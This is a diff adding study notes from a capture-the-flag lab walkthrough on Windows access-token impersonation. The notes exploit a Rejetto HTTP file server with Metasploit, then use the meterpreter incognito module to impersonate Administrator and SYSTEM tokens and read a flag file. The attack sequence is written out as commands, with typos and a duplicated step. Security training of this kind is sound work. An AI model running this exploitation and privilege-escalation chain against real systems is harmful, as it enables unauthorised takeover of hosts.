@@ -273,3 +273,52 @@
   - SeCreateToken: Allows a user to create an arbitrary token with administrative privileges.
   - SemlpersonatePrivilege: Allows a user to create a process under the security context of another user typically with administrative privileges.
 
+ In oder to perform access token impersonation, we are going to utilizing a meterpreter session on the target and we are utilizing a inbuilt meterpreter module "incognito"
+
+## THe Incognito Module
+
+- Incognito is a built in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.
+- We can use the incognito module to display a list of available tokens that we can impersonate.
+
+## Demo
+
+`nmap [target IP]`
+Port 80 is open. we paste the target IP into the webbrowser. We see the Rejetto http fileserver running.
+`service postgresql start && msfconsole`
+`search rejetto`
+`use module 0`
+`show options`
+eventually we have to set up our own IP as LHOST and a port at LPORT
+`set rhosts [target IP]`
+`exploit`
+meterpreter: `sysinfo`
+meterpreter: `pgrep explorer`
+meterpeter: `migrate 3512`: We cant migrate because we have access to an unprivileged user account
+meterpreter: `getuid`
+meterpreter `getprivs`
+meterpreter: `load incognito`
+meterpreter: `exploit`
+meterpreter: `load incognito`
+
+meterpreter: `list_tokens`
+meterpreter: `impersonate_token "ATTACKDEFENSE\Administrator"`
+meterpreter: `getuid`
+meterpreter: `getprivs`
+meterpreter: `pgrep explorer`
+meterpreter: `migrate 3512`
+meterpreter: `getprivs`: we have elevated session. privileged user
+meterpreter: `getuid`
+generates NT authority system access token, which we then can impersonate and obtain the privileges associated with the nT authority system access token. In case of admin user privileges assocsiated with admin user
+
+impersonate token:
+meterpreter: `impersonate_token "NT AUTHORITY\SYSTEM"`
+meterpreter: `getuid`
+meterpreter: `getprivs`
+
+How to get the flag:
+Step 8: We can notice that the Administrator user token is available. Impersonate the Administrator user token and read the flag.
+
+Command: 
+impersonate_token ATTACKDEFENSE\\Administrator 
+getuid
+cat C:\\Users\\Administrator\\Desktop\\flag.txt
